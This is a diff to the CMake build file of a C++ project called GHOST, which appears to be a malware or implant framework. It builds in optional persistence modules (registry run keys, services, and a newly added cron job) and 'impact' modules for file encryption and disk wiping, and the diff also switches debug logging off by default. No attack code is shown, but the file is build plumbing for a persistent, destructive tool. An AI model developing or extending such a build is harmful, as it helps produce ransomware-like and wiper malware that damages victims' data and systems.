@@ -2,6 +2,10 @@ cmake_minimum_required(VERSION 3.14)
 project(GHOST)
 
 set(CMAKE_CXX_STANDARD 20)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+
+# === OUTPUT CONFIGURATION ===
+set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
 
 # === DEPENDENCIES ===
 include(FetchContent)
@@ -9,7 +13,7 @@ FetchContent_Declare(cpr GIT_REPOSITORY https://github.com/libcpr/cpr.git GIT_TA
 FetchContent_MakeAvailable(cpr)
 
 # === GLOBAL FLAGS ===
-option(ENABLE_DEBUG "Enable verbose logging" ON)
+option(ENABLE_DEBUG "Enable verbose logging" OFF)
 if(ENABLE_DEBUG)
     add_compile_definitions(DEBUG_MODE)
 endif()
@@ -29,10 +33,15 @@ if(ENABLE_PERSISTENCE)
         add_compile_definitions(METHOD_RUNCONTROL)
         list(APPEND MODULE_SOURCES src/modules/persistence/RunControl.cpp)
     endif()
-    
+
     if(PERSIST_SERVICE)
         add_compile_definitions(METHOD_SERVICE)
         list(APPEND MODULE_SOURCES src/modules/persistence/Service.cpp)
+    endif()
+
+    if(PERSIST_CRON)
+        add_compile_definitions(METHOD_CRON)
+        list(APPEND MODULE_SOURCES src/modules/persistence/CronJob.cpp)
     endif()
 endif()
 
@@ -50,7 +59,7 @@ if(ENABLE_IMPACT)
         add_compile_definitions(METHOD_ENCRYPT)
         list(APPEND MODULE_SOURCES src/modules/impact/Encryption.cpp)
     endif()
-    
+
     if(IMPACT_WIPE)
         add_compile_definitions(METHOD_WIPE)
         list(APPEND MODULE_SOURCES src/modules/impact/Wiper.cpp)
